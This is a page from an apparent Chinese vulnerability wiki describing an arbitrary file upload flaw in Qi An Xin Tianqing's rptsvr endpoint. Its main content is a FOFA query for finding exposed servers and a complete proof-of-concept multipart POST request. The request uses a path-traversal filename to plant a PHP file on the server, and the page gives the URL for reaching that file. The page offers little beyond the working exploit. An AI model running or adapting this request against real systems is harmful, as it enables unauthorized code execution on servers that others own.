@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E6%93%8E/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8Erptsvr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>奇安信天擎rptsvr任意文件上传 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5947\u5b89\u4fe1\u5929\u64cerptsvr\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+              {title: "\u8bbf\u95ee\u4e0a\u4f20\u6587\u4ef6\u8def\u5f84\u5982\u4e0b\uff1a", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99directdata%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99directdata%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        奇安信网康下一代防火墙directdata存在远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%A5%87%E5%AE%89%E4%BF%A1VPN%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%A5%87%E5%AE%89%E4%BF%A1VPN%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" class="btn btn-xs btn-link">
+        奇安信VPN任意用户密码重置
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="rptsvr">奇安信天擎rptsvr任意文件上传<a class="headerlink" href="#rptsvr" title="Permanent link">&para;</a></h2>
+<p>奇安信 天擎管理中心 &lt;=V6.7.0.4130 版本的rptsvr接口存在任意文件上传漏洞，可上传恶意至服务器，执行脚本文件。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>banner=&quot;QiAnXin web server&quot; || banner=&quot;360 web server&quot;  || body=&quot;appid\&quot;:\&quot;skylar6&quot; || body=&quot;/task/index/detail?id={item.id}&quot; || body=&quot;已过期或者未授权，购买请联系4008-136-360&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST /rptsvr/upload HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+Connection: close
+Content-Length: 414
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
+Upgrade-Insecure-Requests: 1
+
+-----------------------------55433477442814818502792421460
+Content-Disposition: form-data; name=&quot;uploadfile&quot;; filename=&quot;../../../application/api/controllers/TController2.php&quot;
+Content-Type: text/x-python
+
+&lt;?php
+phpinfo();
+?&gt;
+-----------------------------55433477442814818502792421460
+Content-Disposition: form-data; name=&quot;token&quot;
+
+skylar_report
+-----------------------------55433477442814818502792421460
+</code></pre></div>
+<p><img alt="ee8643c18675a73d8d0a327cb110adde" src="https://github.com/wy876/POC/assets/139549762/e202d50b-2860-47b8-8670-07b015a5cc7f" /></p>
+<h4 id="_1">访问上传文件路径如下：<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
+<p><code>http://xxxx/application/api/controllers/TController2.php</code></p>
+<p><img alt="099c23949f851175f1e3306c0c102637" src="https://github.com/wy876/POC/assets/139549762/73b370c6-2c4f-4422-ada3-33ebf4a952b2" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99directdata%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99directdata%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        奇安信网康下一代防火墙directdata存在远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%A5%87%E5%AE%89%E4%BF%A1VPN%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%A5%87%E5%AE%89%E4%BF%A1VPN%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" class="btn btn-xs btn-link">
+        奇安信VPN任意用户密码重置
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
